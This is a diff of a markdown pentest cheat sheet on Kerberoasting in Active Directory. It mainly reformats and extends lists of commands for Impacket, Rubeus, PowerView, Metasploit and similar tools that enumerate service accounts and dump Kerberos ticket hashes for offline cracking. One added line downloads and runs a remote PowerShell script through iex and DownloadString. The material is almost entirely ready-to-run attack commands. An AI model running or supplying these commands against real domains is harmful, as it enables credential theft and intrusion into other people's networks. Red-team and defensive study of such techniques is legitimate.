@@ -67,33 +67,37 @@
 
 ## Linux
 
- - GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"
+    GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"
 
 ## Windows
 
- - Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
+    Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 
 # Kerberoastable users enumeration
 
 ## Windows
 
- - setspn.exe -Q */* (This is a built-in binary. Focus on user accounts)
+    setspn.exe -Q */* (This is a built-in binary. Focus on user accounts)
 
- - Get-NetUser -SPN | select serviceprincipalname (Powerview)
+    setspn -T [Domain] -Q */* (    Gets all SPNs, Includes machine account SPNs)
 
- - .\Rubeus.exe kerberoast /stats
+    Get-DomainUser -SPN | Select SamAccountName,DisplayName,ServicePrincipalName (Powerview)
+
+    .\Rubeus.exe kerberoast /stats
+
+    iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/RedTeam-Pentest-Tools/main/Kerberoasting/Get-SPNs.ps1")
 
 ## Linux (Metaploit, Impacket, https://github.com/skelsec/kerberoast)
 
- - msf> use auxiliary/gather/get_user_spns (Metasploit)
+    msf> use auxiliary/gather/get_user_spns (Metasploit)
 
- - GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast  (Password will be prompted)
+    GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast  (Password will be prompted)
 
- - GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
+    GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
 
- - kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable ( 1. Enumerate kerberoastable users)
+    kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable ( 1. Enumerate kerberoastable users)
 
- - kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes ( 2. Dump hashes)
+    kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes ( 2. Dump hashes)
 
 
 # Targeted Kerberoasting
